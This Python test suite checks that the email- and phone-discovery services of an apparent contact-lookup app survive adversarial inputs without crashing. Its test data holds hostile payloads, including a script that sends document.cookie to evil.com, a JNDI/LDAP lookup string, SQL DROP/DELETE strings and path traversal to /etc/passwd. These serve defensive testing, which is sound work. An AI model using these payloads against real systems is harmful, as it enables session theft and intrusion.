"""
Round 3 (ADVERSARIAL) — Malformed / Garbage Input Tests
=========================================================
Tests that the system handles adversarial inputs without crashing:
SQL injection, XSS payloads, path traversal, extremely long strings,
control characters, format string attacks, emoji/Unicode, whitespace.

90+ tests across 8 categories.
"""

import pytest
import re
from dataclasses import dataclass

from app.utils.phone import normalize_phone
from app.services.phase2.russian_phone_validator import (
    RussianPhoneValidator, PhoneInfo, validate_phone, extract_phones_from_text,
)
from app.services.phase2.email_discovery import EmailDiscoveryService
from app.services.phase2.phone_discovery import PhoneDiscoveryService
from app.services.phase2.base_source import SourceResult, SourceTier, SourceType


# ── Shared fixtures ──────────────────────────────────────────────────

@pytest.fixture
def email_svc():
    svc = EmailDiscoveryService()
    yield svc
    svc.close()


@pytest.fixture
def phone_svc():
    svc = PhoneDiscoveryService()
    yield svc
    svc.close()


@pytest.fixture
def validator():
    return RussianPhoneValidator()


# =====================================================================
# 1. SQL INJECTION IN INPUTS  (15 tests)
# =====================================================================

class TestSQLInjection:
    """Verify no crash / no passthrough on classic SQL-injection payloads."""

    def test_normalize_phone_sql_drop(self):
        result = normalize_phone("'; DROP TABLE phones; --")
        assert isinstance(result, str)
        # No digits at all → original returned
        assert result == "'; DROP TABLE phones; --"

    def test_normalize_phone_sql_union(self):
        result = normalize_phone("1' UNION SELECT * FROM users--")
        assert isinstance(result, str)

    def test_normalize_phone_sql_or_1_eq_1(self):
        result = normalize_phone("' OR 1=1 --")
        assert isinstance(result, str)

    def test_email_candidates_sql_in_first_name(self, email_svc):
        candidates = email_svc._generate_candidates(
            "Robert'; DROP TABLE--", "Students", []
        )
        assert isinstance(candidates, list)
        for c in candidates:
            assert "@" in c

    def test_email_candidates_sql_in_last_name(self, email_svc):
        candidates = email_svc._generate_candidates(
            "Ivan", "'; DELETE FROM users; --", []
        )
        assert isinstance(candidates, list)

    def test_email_candidates_sql_in_username(self, email_svc):
        candidates = email_svc._generate_candidates(
            "Ivan", "Petrov", ["'; UNION SELECT * FROM--"]
        )
        assert isinstance(candidates, list)

    def test_is_valid_email_sql(self, email_svc):
        assert email_svc._is_valid_email("test@mail.ru'; DROP TABLE--") is False

    def test_is_valid_email_sql_semicolon(self, email_svc):
        assert email_svc._is_valid_email("admin'; --@mail.ru") is False

    def test_clean_username_sql(self, email_svc):
        cleaned = email_svc._clean_username("id'; DELETE FROM users")
        assert ";" not in cleaned
        assert "'" not in cleaned
        assert isinstance(cleaned, str)

    def test_clean_username_sql_comment(self, email_svc):
        cleaned = email_svc._clean_username("user--; DROP TABLE")
        assert "--" not in cleaned

    def test_extract_from_usernames_sql(self, phone_svc):
        result = phone_svc._extract_from_usernames(["'; UNION SELECT * FROM--"])
        assert isinstance(result, list)
        assert len(result) == 0

    def test_extract_from_emails_sql(self, phone_svc):
        result = phone_svc._extract_from_emails(["'; DROP TABLE--@mail.ru"])
        assert isinstance(result, list)
        assert len(result) == 0

    def test_normalize_key_sql(self, phone_svc):
        result = phone_svc._normalize_key("'; DROP TABLE--")
        assert isinstance(result, str)

    def test_validator_validate_sql(self, validator):
        info = validator.validate("'; DROP TABLE phones; --")
        assert isinstance(info, PhoneInfo)
        assert info.is_valid is False

    def test_extract_phones_sql_text(self, validator):
        result = validator.extract_phones("Call me at '; DROP TABLE phones; --")
        assert isinstance(result, list)
        assert len(result) == 0


# =====================================================================
# 2. XSS PAYLOADS  (11 tests)
# =====================================================================

class TestXSSPayloads:
    """Verify XSS payloads are neutralized or don't crash processing."""

    def test_candidates_xss_script_tag(self, email_svc):
        candidates = email_svc._generate_candidates(
            "<script>alert('xss')</script>", "Last", []
        )
        assert isinstance(candidates, list)
        # Script tags should not appear in any valid email
        for c in candidates:
            assert "<script>" not in c

    def test_candidates_xss_img_tag(self, email_svc):
        candidates = email_svc._generate_candidates(
            "<img src=x onerror=alert(1)>", "Name", []
        )
        assert isinstance(candidates, list)

    def test_is_valid_email_xss_img(self, email_svc):
        assert email_svc._is_valid_email("<img src=x onerror=alert(1)>@mail.ru") is False

    def test_is_valid_email_xss_script(self, email_svc):
        assert email_svc._is_valid_email("<script>alert(1)</script>@mail.ru") is False

    def test_clean_username_xss_script(self, email_svc):
        cleaned = email_svc._clean_username("<script>alert(1)</script>")
        # Only [a-z0-9_.] survive
        assert "<" not in cleaned
        assert ">" not in cleaned

    def test_clean_username_xss_event(self, email_svc):
        cleaned = email_svc._clean_username("onmouseover=alert(1)")
        assert "(" not in cleaned
        assert ")" not in cleaned

    def test_source_result_xss_value(self):
        """SourceResult stores raw data — to_dict must not crash."""
        sr = SourceResult(
            data_type="email",
            value="<script>alert(1)</script>",
            source_name="test",
            source_tier=SourceTier.C,
            confidence=0.5,
        )
        d = sr.to_dict()
        assert d["value"] == "<script>alert(1)</script>"
        assert isinstance(d, dict)

    def test_normalize_phone_xss(self):
        result = normalize_phone("<script>alert(1)</script>")
        assert isinstance(result, str)

    def test_transliterate_xss(self, email_svc):
        result = email_svc._transliterate("<script>alert('xss')</script>")
        assert isinstance(result, str)

    def test_validator_xss_phone(self, validator):
        info = validator.validate("<img/src=x onerror=alert(1)>")
        assert info.is_valid is False

    def test_extract_phones_xss_text(self, validator):
        result = validator.extract_phones(
            "<script>document.location='http://evil.com?c='+document.cookie</script>"
        )
        assert isinstance(result, list)
        assert len(result) == 0


# =====================================================================
# 3. PATH TRAVERSAL  (10 tests)
# =====================================================================

class TestPathTraversal:
    """Verify path-traversal strings don't pass through to file operations."""

    def test_candidates_path_in_first_name(self, email_svc):
        candidates = email_svc._generate_candidates(
            "../../../etc/passwd", "test", []
        )
        assert isinstance(candidates, list)

    def test_candidates_path_in_last_name(self, email_svc):
        candidates = email_svc._generate_candidates(
            "name", "..\\..\\windows\\system32", []
        )
        assert isinstance(candidates, list)

    def test_is_valid_email_path(self, email_svc):
        assert email_svc._is_valid_email("../../@mail.ru") is False

    def test_is_valid_email_windows_path(self, email_svc):
        assert email_svc._is_valid_email("C:\\Users\\admin@mail.ru") is False

    def test_clean_username_path_traversal(self, email_svc):
        cleaned = email_svc._clean_username("../../etc/passwd")
        # Slashes and dots-beyond-single should be cleaned
        assert "/" not in cleaned
        assert isinstance(cleaned, str)

    def test_clean_username_windows_path(self, email_svc):
        cleaned = email_svc._clean_username("..\\..\\windows\\system32")
        assert "\\" not in cleaned

    def test_normalize_phone_path(self):
        result = normalize_phone("../../../etc/passwd")
        assert isinstance(result, str)

    def test_transliterate_path(self, email_svc):
        result = email_svc._transliterate("../../../etc/passwd")
        assert isinstance(result, str)

    def test_extract_from_usernames_path(self, phone_svc):
        result = phone_svc._extract_from_usernames(["../../etc/passwd"])
        assert isinstance(result, list)
        assert len(result) == 0

    def test_normalize_key_path(self, phone_svc):
        result = phone_svc._normalize_key("../../../etc/passwd")
        assert isinstance(result, str)


# =====================================================================
# 4. EXTREMELY LONG STRINGS  (16 tests)
# =====================================================================

class TestExtremelyLongStrings:
    """Verify system handles very long inputs without crash or hang."""

    def test_normalize_phone_10k_digits(self):
        result = normalize_phone("9" * 10000)
        assert isinstance(result, str)

    def test_normalize_phone_10k_mixed(self):
        result = normalize_phone("+" + "7 916 " * 2000)
        assert isinstance(result, str)

    def test_candidates_5k_russian_names(self, email_svc):
        candidates = email_svc._generate_candidates(
            "\u0410" * 5000, "\u0411" * 5000, []
        )
        assert isinstance(candidates, list)

    def test_candidates_many_usernames(self, email_svc):
        usernames = [f"user{i}" for i in range(1000)]
        candidates = email_svc._generate_candidates("Ivan", "Petrov", usernames)
        assert isinstance(candidates, list)
        assert len(candidates) <= email_svc.max_candidates

    def test_is_valid_email_over_254(self, email_svc):
        long_email = "a" * 300 + "@mail.ru"
        assert email_svc._is_valid_email(long_email) is False

    def test_is_valid_email_exactly_254(self, email_svc):
        # 254 total = local + @ + domain
        # "a" * 244 + "@" + "mail.ru" = 244 + 1 + 7 = 252 — valid length
        email_252 = "a" * 244 + "@mail.ru"
        assert len(email_252) == 252
        # Should pass length check; pattern may or may not match
        assert isinstance(email_svc._is_valid_email(email_252), bool)

    def test_transliterate_large(self, email_svc):
        result = email_svc._transliterate("\u041f\u0440\u0438\u0432\u0435\u0442" * 1000)
        assert isinstance(result, str)
        assert len(result) > 0

    def test_extract_phones_large_text(self, validator):
        text = "text " * 10000
        result = validator.extract_phones(text)
        assert isinstance(result, list)
        assert len(result) == 0

    def test_extract_phones_large_text_with_phone(self, validator):
        text = "word " * 5000 + "+79161234567" + " word" * 5000
        result = validator.extract_phones(text)
        assert isinstance(result, list)
        assert len(result) == 1

    def test_extract_from_usernames_huge(self, phone_svc):
        result = phone_svc._extract_from_usernames(["x" * 10000])
        assert isinstance(result, list)

    def test_extract_from_emails_huge(self, phone_svc):
        result = phone_svc._extract_from_emails(["a" * 10000 + "@mail.ru"])
        assert isinstance(result, list)

    def test_normalize_key_huge(self, phone_svc):
        result = phone_svc._normalize_key("+" + "1" * 10000)
        assert isinstance(result, str)
        # Should take last 10 digits
        assert len(result) <= 10

    def test_clean_username_huge(self, email_svc):
        cleaned = email_svc._clean_username("a" * 10000)
        assert isinstance(cleaned, str)

    def test_validator_huge_phone(self, validator):
        info = validator.validate("+" + "7" * 10000)
        assert isinstance(info, PhoneInfo)
        assert info.is_valid is False

    def test_source_result_long_value_to_dict(self):
        sr = SourceResult(
            data_type="email",
            value="a" * 10000 + "@mail.ru",
            source_name="x" * 5000,
            source_tier=SourceTier.C,
            confidence=0.5,
            raw_data={"big": "y" * 10000},
            metadata={"key": "z" * 10000},
        )
        d = sr.to_dict()
        assert isinstance(d, dict)
        assert len(d["value"]) > 10000

    def test_generate_variants_huge(self, validator):
        variants = validator.generate_variants("+" + "9" * 10000)
        assert isinstance(variants, list)


# =====================================================================
# 5. CONTROL CHARACTERS  (11 tests)
# =====================================================================

class TestControlCharacters:
    """Verify null bytes, newlines, and low-ASCII control chars don't crash."""

    def test_normalize_phone_null_bytes(self):
        result = normalize_phone("+7\x00916\x001234567")
        assert isinstance(result, str)

    def test_normalize_phone_mixed_control(self):
        result = normalize_phone("+7\t916\n123\r4567")
        assert isinstance(result, str)

    def test_candidates_control_in_names(self, email_svc):
        candidates = email_svc._generate_candidates(
            "\u0418\u0432\u0430\u043d\x00", "\u041f\u0435\u0442\u0440\u043e\u0432\n\r\t", []
        )
        assert isinstance(candidates, list)

    def test_is_valid_email_null_byte(self, email_svc):
        assert email_svc._is_valid_email("test\x00@mail.ru") is False

    def test_is_valid_email_newline(self, email_svc):
        assert email_svc._is_valid_email("test\n@mail.ru") is False

    def test_clean_username_newline(self, email_svc):
        cleaned = email_svc._clean_username("test\nnewline")
        assert "\n" not in cleaned

    def test_clean_username_tab(self, email_svc):
        cleaned = email_svc._clean_username("test\ttab")
        assert "\t" not in cleaned

    def test_transliterate_low_ascii(self, email_svc):
        result = email_svc._transliterate("\u0442\u0435\u0441\u0442\x01\x02\x03")
        assert isinstance(result, str)

    def test_validator_null_in_phone(self, validator):
        info = validator.validate("+7\x009161234567")
        assert isinstance(info, PhoneInfo)

    def test_extract_phones_control_chars(self, validator):
        text = "Call \x00 me \x01 at \x02 +79161234567 \x03"
        result = validator.extract_phones(text)
        assert isinstance(result, list)

    def test_normalize_key_null(self, phone_svc):
        result = phone_svc._normalize_key("+7\x009161234567")
        assert isinstance(result, str)


# =====================================================================
# 6. FORMAT STRING ATTACKS  (10 tests)
# =====================================================================

class TestFormatStringAttacks:
    """Verify C/Python/Java format strings and JNDI don't cause issues."""

    def test_normalize_phone_percent_s(self):
        result = normalize_phone("%s%s%s%s%s")
        assert isinstance(result, str)
        assert result == "%s%s%s%s%s"

    def test_normalize_phone_percent_n(self):
        result = normalize_phone("%n%n%n%n")
        assert isinstance(result, str)

    def test_candidates_python_format(self, email_svc):
        candidates = email_svc._generate_candidates(
            "{0}", "{{password}}", []
        )
        assert isinstance(candidates, list)

    def test_candidates_f_string_style(self, email_svc):
        candidates = email_svc._generate_candidates(
            "${USER}", "${HOME}", []
        )
        assert isinstance(candidates, list)

    def test_is_valid_email_jndi(self, email_svc):
        assert email_svc._is_valid_email("${jndi:ldap://evil.com}@mail.ru") is False

    def test_is_valid_email_percent_format(self, email_svc):
        assert email_svc._is_valid_email("%s%s%s@mail.ru") is False

    def test_transliterate_percent_n(self, email_svc):
        result = email_svc._transliterate("%n%n%n%n")
        assert isinstance(result, str)
        # %n passes through unchanged (non-Cyrillic chars)
        assert "%n" in result

    def test_clean_username_format(self, email_svc):
        cleaned = email_svc._clean_username("${jndi:ldap://evil.com}")
        assert "$" not in cleaned
        assert "{" not in cleaned

    def test_validator_format_string(self, validator):
        info = validator.validate("%s%s%s%s")
        assert isinstance(info, PhoneInfo)
        assert info.is_valid is False

    def test_extract_phones_format_text(self, validator):
        result = validator.extract_phones("printf('%n%n%n') call me at {phone}")
        assert isinstance(result, list)
        assert len(result) == 0


# =====================================================================
# 7. EMOJI AND SPECIAL UNICODE  (12 tests)
# =====================================================================

class TestEmojiAndSpecialUnicode:
    """Verify emoji, CJK chars, RTL markers, zero-width chars don't crash."""

    def test_normalize_phone_emoji(self):
        result = normalize_phone("\U0001f4de+7916\U0001f4a51234567")
        assert isinstance(result, str)

    def test_normalize_phone_only_emoji(self):
        result = normalize_phone("\U0001f4de\U0001f4a5\U0001f525")
        assert isinstance(result, str)

    def test_candidates_emoji_names(self, email_svc):
        candidates = email_svc._generate_candidates(
            "\u0418\u0432\u0430\u043d\U0001f525", "\u041f\u0435\u0442\u0440\u043e\u0432\U0001f48e", []
        )
        assert isinstance(candidates, list)

    def test_is_valid_email_emoji(self, email_svc):
        assert email_svc._is_valid_email("test\U0001f600@mail.ru") is False

    def test_transliterate_mixed_emoji(self, email_svc):
        result = email_svc._transliterate("\u041f\u0440\u0438\u0432\u0435\u0442\U0001f30d\u041c\u0438\u0440")
        assert isinstance(result, str)
        # Cyrillic should transliterate, emoji passes through
        assert "privet" in result
        assert "mir" in result

    def test_clean_username_emoji(self, email_svc):
        cleaned = email_svc._clean_username("user\U0001f3aename")
        # Emoji should be stripped (not in [a-z0-9_.])
        assert "\U0001f3ae" not in cleaned

    def test_validator_emoji_phone(self, validator):
        info = validator.validate("\U0001f4de+79161234567\U0001f4de")
        assert isinstance(info, PhoneInfo)

    def test_extract_phones_emoji_text(self, validator):
        text = "\U0001f4de Call me +79161234567 \U0001f4f1"
        result = validator.extract_phones(text)
        assert isinstance(result, list)

    def test_zero_width_chars(self, email_svc):
        # Zero-width space, zero-width joiner, zero-width non-joiner
        result = email_svc._is_valid_email("te\u200bst@mail.ru")
        assert result is False

    def test_rtl_override(self, email_svc):
        result = email_svc._is_valid_email("test\u202e@mail.ru")
        assert result is False

    def test_cjk_in_names(self, email_svc):
        candidates = email_svc._generate_candidates(
            "\u4e2d\u6587", "\u540d\u5b57", []
        )
        assert isinstance(candidates, list)

    def test_normalize_phone_combining_chars(self):
        # Combining diacritical marks
        result = normalize_phone("+7\u0301916\u03081234567")
        assert isinstance(result, str)


# =====================================================================
# 8. WHITESPACE VARIATIONS  (11 tests)
# =====================================================================

class TestWhitespaceVariations:
    """Verify various whitespace characters are handled gracefully."""

    def test_normalize_phone_excessive_spaces(self):
        result = normalize_phone("  +7 916  123 45 67  ")
        assert isinstance(result, str)
        # After stripping non-digits we get 79161234567 (11 digits starting with 7)
        assert result == "+79161234567"

    def test_normalize_phone_tabs(self):
        result = normalize_phone("\t+7\t916\t1234567\t")
        assert isinstance(result, str)

    def test_normalize_phone_nbsp(self):
        # Non-breaking space U+00A0
        result = normalize_phone("+7\xa0916\xa01234567")
        assert isinstance(result, str)

    def test_candidates_padded_names(self, email_svc):
        candidates = email_svc._generate_candidates(
            "  \u0418\u0432\u0430\u043d  ", "  \u041f\u0435\u0442\u0440\u043e\u0432  ", []
        )
        assert isinstance(candidates, list)
        assert len(candidates) > 0

    def test_is_valid_email_leading_space(self, email_svc):
        # Leading space means first char is not [a-z0-9]
        assert email_svc._is_valid_email(" test@mail.ru") is False

    def test_is_valid_email_trailing_space(self, email_svc):
        assert email_svc._is_valid_email("test@mail.ru ") is False

    def test_is_valid_email_internal_space(self, email_svc):
        assert email_svc._is_valid_email("te st@mail.ru") is False

    def test_clean_username_whitespace(self, email_svc):
        cleaned = email_svc._clean_username("  user  name  ")
        assert " " not in cleaned

    def test_clean_username_vertical_tab(self, email_svc):
        cleaned = email_svc._clean_username("user\x0bname")
        assert "\x0b" not in cleaned

    def test_clean_username_form_feed(self, email_svc):
        cleaned = email_svc._clean_username("user\x0cname")
        assert "\x0c" not in cleaned

    def test_extract_phones_whitespace_heavy(self, validator):
        text = "  \t\n  +7  916  123  45  67  \r\n  "
        result = validator.extract_phones(text)
        assert isinstance(result, list)


# =====================================================================
# ADDITIONAL ADVERSARIAL EDGE CASES  (7 tests)
# =====================================================================

class TestAdditionalAdversarial:
    """Extra adversarial tests for edge cases and combinations."""

    def test_normalize_phone_empty_string(self):
        assert normalize_phone("") == ""

    def test_normalize_phone_none(self):
        assert normalize_phone(None) == ""

    def test_normalize_phone_only_plus(self):
        result = normalize_phone("+")
        assert isinstance(result, str)

    def test_source_result_confidence_label_boundaries(self):
        """Verify confidence_label property with adversarial confidence values."""
        sr1 = SourceResult("email", "x", "s", SourceTier.C, 0.0)
        assert sr1.confidence_label == "low"

        sr2 = SourceResult("email", "x", "s", SourceTier.C, 1.0)
        assert sr2.confidence_label == "very_high"

        sr3 = SourceResult("email", "x", "s", SourceTier.C, 0.5)
        assert sr3.confidence_label == "medium"

        sr4 = SourceResult("email", "x", "s", SourceTier.C, 0.7)
        assert sr4.confidence_label == "high"

    def test_deduplicate_xss_values(self):
        """SourceManager._deduplicate with XSS in values."""
        from app.services.phase2.source_manager import SourceManager
        mgr = SourceManager.__new__(SourceManager)
        mgr.sources = []

        results = [
            SourceResult(
                data_type="email",
                value="<script>alert(1)</script>",
                source_name="src1",
                source_tier=SourceTier.C,
                confidence=0.5,
            ),
            SourceResult(
                data_type="email",
                value="<script>alert(1)</script>",
                source_name="src2",
                source_tier=SourceTier.C,
                confidence=0.6,
            ),
        ]
        deduped = mgr._deduplicate(results)
        assert len(deduped) == 1
        assert deduped[0].metadata.get("source_count") == 2

    def test_cross_validate_malformed_data_types(self):
        """SourceManager._cross_validate with non-standard data_type values."""
        from app.services.phase2.source_manager import SourceManager
        mgr = SourceManager.__new__(SourceManager)
        mgr.sources = []

        results = [
            SourceResult(
                data_type="<script>",
                value="evil",
                source_name="test",
                source_tier=SourceTier.S,
                confidence=0.9,
            ),
            SourceResult(
                data_type="'; DROP TABLE--",
                value="more_evil",
                source_name="test2",
                source_tier=SourceTier.A,
                confidence=0.8,
            ),
        ]
        validated = mgr._cross_validate(results)
        assert isinstance(validated, list)
        assert len(validated) == 2

    def test_is_russian_mobile_garbage(self, validator):
        assert validator.is_russian_mobile("'; DROP TABLE--") is False
        assert validator.is_russian_mobile("<script>") is False
        assert validator.is_russian_mobile("") is False
        assert validator.is_russian_mobile("abc") is False
